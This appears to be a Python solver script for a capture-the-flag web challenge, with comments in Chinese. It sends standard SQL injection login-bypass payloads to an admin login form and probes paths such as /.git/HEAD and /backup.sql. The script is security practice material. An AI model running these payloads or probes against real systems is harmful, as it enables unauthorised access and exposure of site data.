import requests
from bs4 import BeautifulSoup

base_url = "http://challenge.bluesharkinfo.com:28343"
login_url = f"{base_url}/admin/login.php"

# 获取登录页面源代码
print("=" * 60)
print("获取登录页面源代码...")
print("=" * 60)
response = requests.get(login_url)
print(response.text)
print("\n")

# 解析HTML查看表单详情
soup = BeautifulSoup(response.text, 'html.parser')
forms = soup.find_all('form')
print("=" * 60)
print("表单信息:")
print("=" * 60)
for form in forms:
    print(f"Action: {form.get('action')}")
    print(f"Method: {form.get('method')}")
    inputs = form.find_all('input')
    for inp in inputs:
        print(f"  Input: name={inp.get('name')}, type={inp.get('type')}")
print("\n")

# 尝试SQL注入测试
print("=" * 60)
print("测试SQL注入...")
print("=" * 60)
payloads = [
    ("admin", "' OR '1'='1"),
    ("admin' --", "anything"),
    ("admin' #", "anything"),
    ("admin'/*", "anything"),
    ("admin", "1' OR '1'='1"),
    ("' OR '1'='1' --", "' OR '1'='1' --"),
]

for username, password in payloads:
    data = {
        'username': username,
        'password': password
    }
    resp = requests.post(login_url, data=data, allow_redirects=False)
    print(f"Payload: username='{username}', password='{password}'")
    print(f"Status: {resp.status_code}")
    if 'flag' in resp.text.lower() or 'success' in resp.text.lower():
        print("可能找到flag!")
        print(resp.text)
    if resp.status_code == 302:
        print(f"重定向到: {resp.headers.get('Location')}")
    print("-" * 40)

# 尝试目录遍历
print("\n" + "=" * 60)
print("尝试常见路径...")
print("=" * 60)
paths = [
    "/admin/index.php",
    "/admin/dashboard.php",
    "/admin/home.php",
    "/flag",
    "/.git/HEAD",
    "/admin/.git/HEAD",
    "/backup.sql",
    "/admin/backup.sql",
]

for path in paths:
    try:
        resp = requests.get(base_url + path, timeout=5)
        print(f"{path}: {resp.status_code}")
        if resp.status_code == 200 and len(resp.text) > 0 and len(resp.text) < 1000:
            print(f"  内容: {resp.text[:200]}")
    except Exception as e:
        print(f"{path}: Error - {e}")
